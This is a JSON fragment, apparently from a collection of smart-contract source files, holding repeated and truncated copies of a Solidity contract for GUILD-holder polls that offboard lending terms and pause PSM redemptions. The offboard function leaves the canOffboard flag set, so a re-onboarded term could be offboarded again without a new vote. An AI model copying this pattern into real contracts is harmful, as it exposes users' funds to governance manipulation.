met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToken;\n        psm = _psm;\n        quorum = _quorum;\n    }\n\n    /// @notice set the quorum for offboard votes\n    function setQuorum(\n        uint256 _quorum\n    ) external onlyCoreRole(CoreRoles.GOVERNOR) {\n        emit QuorumUpdated(quorum, _quorum);\n        quorum = _quorum;\n    }\n\n    /// @notice Propose to offboard a given LendingTerm.\n    /// @dev the poll starts with 1 wei of voting power, to initialize the storage slot\n    /// that counts the number of user supports (a value of 0 is used as the existence\n    /// check to know if a poll has been created).\n    function proposeOffboard(address term) external whenNotPaused {\n        require(\n            polls[block.number][term] == 0,\n            \"LendingTermOffboarding: poll exists\"\n        );\n        require(\n            block.number > lastPollBlock[term] + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll active\"\n        );\n        // Check that the term is an active gauge\n        require(\n            GuildToken(guildToken).isGauge(term),\n            \"LendingTermOffboarding: not an active term\"\n        );\n\n        polls[block.number][term] = 1; // voting power\n        lastPollBlock[term] = block.number;\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            block.number,\n            address(0),\n            1\n        );\n    }\n\n    /// @notice Support a poll to offboard a given LendingTerm.\n    function supportOffboard(\n        uint256 snapshotBlock,\n        address term\n    ) external whenNotPaused {\n        require(\n            block.number <= snapshotBlock + POLL_DURATION_BLOCKS,\n            \"LendingTermOffboarding: poll expired\"\n        );\n        uint256 _weight = polls[snapshotBlock][term];\n        require(_weight != 0, \"LendingTermOffboarding: poll not found\");\n        uint256 userWeight = GuildToken(guildToken).getPastVotes(\n            msg.sender,\n            snapshotBlock\n        );\n        require(userWeight != 0, \"LendingTermOffboarding: zero weight\");\n        require(\n            userPollVotes[msg.sender][snapshotBlock][term] == 0,\n            \"LendingTermOffboarding: already voted\"\n        );\n\n        userPollVotes[msg.sender][snapshotBlock][term] = userWeight;\n        polls[snapshotBlock][term] = _weight + userWeight;\n        if (_weight + userWeight >= quorum) {\n            canOffboard[term] = true;\n        }\n        emit OffboardSupport(\n            block.timestamp,\n            term,\n            snapshotBlock,\n            msg.sender,\n            userWeight\n        );\n    }\n\n    /// @notice Offboard a LendingTerm.\n    /// This will prevent new loans from being open, and will prevent GUILD holders to vote for the term.\n    /// @param term LendingTerm to offboard from the system.\n    function offboard(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n\n        // update protocol config\n        // this will revert if the term has already been offboarded\n        // through another mean.\n        GuildToken(guildToken).removeGauge(term);\n\n        // pause psm redemptions\n        if (\n            nOffboardingsInProgress++ == 0 &&\n            !SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(true);\n        }\n\n        emit Offboard(block.timestamp, term);\n    }\n\n    /// @notice Cleanup roles of a LendingTerm.\n    /// This is only callable after a term has been offboarded and all its loans have been closed.\n    /// @param term LendingTerm to cleanup.\n    function cleanup(address term) external whenNotPaused {\n        require(canOffboard[term], \"LendingTermOffboarding: quorum not met\");\n        require(\n            LendingTerm(term).issuance() == 0,\n            \"LendingTermOffboarding: not all loans closed\"\n        );\n        require(\n            GuildToken(guildToken).isDeprecatedGauge(term),\n            \"LendingTermOffboarding: re-onboarded\"\n        );\n\n        // update protocol config\n        core().revokeRole(CoreRoles.RATE_LIMITED_CREDIT_MINTER, term);\n        core().revokeRole(CoreRoles.GAUGE_PNL_NOTIFIER, term);\n\n        // unpause psm redemptions\n        if (\n            --nOffboardingsInProgress == 0 && SimplePSM(psm).redemptionsPaused()\n        ) {\n            SimplePSM(psm).setRedemptionsPaused(false);\n        }\n\n        canOffboard[term] = false;\n        emit Cleanup(block.timestamp, term);\n    }\n}"
    },
    {
      "filename": "src/governance/LendingTermOffboarding.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {CoreRef} from \"@src/core/CoreRef.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\n\n/// @notice Utils to offboard a LendingTerm.\n/// This contract works somewhat similarly to a Veto governor: any GUILD holder can poll for the removal\n/// of a lending term, and if enough GUILD holders vote for a removal poll, the term can be offboarded\n/// without delay.\n/// When a term is offboarded, no new loans can be issued, and GUILD holders cannot vote for the term anymore.\n/// After a term is offboarded, all the loans have to be called, then the term can be cleaned up (roles).\ncontract LendingTermOffboarding is CoreRef {\n    /// @notice emitted when a user supports the removal of a lending term\n    event OffboardSupport(\n        uint256 indexed timestamp,\n        address indexed term,\n        uint256 indexed snapshotBlock,\n        address user,\n        uint256 userWeight\n    );\n    /// @notice emitted when a lending term is offboarded\n    event Offboard(uint256 indexed timestamp, address indexed term);\n    /// @notice emitted when a lending term is cleaned up\n    event Cleanup(uint256 indexed timestamp, address indexed term);\n\n    /// @notice Emitted when quorum is updated.\n    event QuorumUpdated(uint256 oldQuorum, uint256 newQuorum);\n\n    /// @notice maximum age of polls for them to be considered valid.\n    /// This offboarding mechanism is meant to be used in a reactive fashion, and\n    /// polls should not stay open for a long time.\n    uint256 public constant POLL_DURATION_BLOCKS = 46523; // ~7 days @ 13s/block\n\n    /// @notice quorum for offboarding a lending term\n    uint256 public quorum;\n\n    /// @notice reference to the GUILD token\n    address public immutable guildToken;\n\n    /// @notice reference to the PSM\n    address public immutable psm;\n\n    /// @notice list of removal polls created.\n    /// keys = [snapshotBlock][termAddress] -> quorum supporting the removal.\n    mapping(uint256 => mapping(address => uint256)) public polls;\n\n    /// @notice list of user votes in removal polls\n    /// keys = [userAddress][snapshotBlock][termAddress] -> user vote weight.\n    mapping(address => mapping(uint256 => mapping(address => uint256)))\n        public userPollVotes;\n\n    /// @notice block number of last removal polls created for each term.\n    /// key = [termAddress] -> block number.\n    mapping(address => uint256) public lastPollBlock;\n\n    /// @notice mapping of terms that can be offboarded.\n    mapping(address => bool) public canOffboard;\n\n    /// @notice number of offboardings in progress.\n    uint256 public nOffboardingsInProgress;\n\n    constructor(\n        address _core,\n        address _guildToken,\n        address _psm,\n        uint256 _quorum\n    ) CoreRef(_core) {\n        guildToken = _guildToke"
    }
  ]
}